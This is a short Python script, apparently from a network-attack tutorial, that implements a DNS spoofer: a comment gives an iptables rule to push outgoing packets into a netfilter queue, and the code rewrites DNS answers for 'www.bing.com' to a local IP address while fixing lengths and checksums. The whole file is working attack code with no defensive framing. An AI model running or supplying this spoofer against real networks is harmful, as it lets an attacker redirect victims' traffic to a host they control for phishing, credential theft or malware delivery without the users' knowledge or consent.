#!/usr/bin/python
#to trap all the requests in queue -- iptables -I OUTPUT -j NFQUEUE --queue-num 0 

import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):         #check if the packet has dns 
        qname = scapy_packet[scapy.DNSQR].qname
        qname = qname.decode()
        if "www.bing.com" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata ="192.168.0.156") # rdata is the ip to be forwarded to
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1 
            
            del scapy_packet[scapy.IP].len      #removes IP len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            
            packet.set_payload(bytes(scapy_packet))
            
            
            
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()


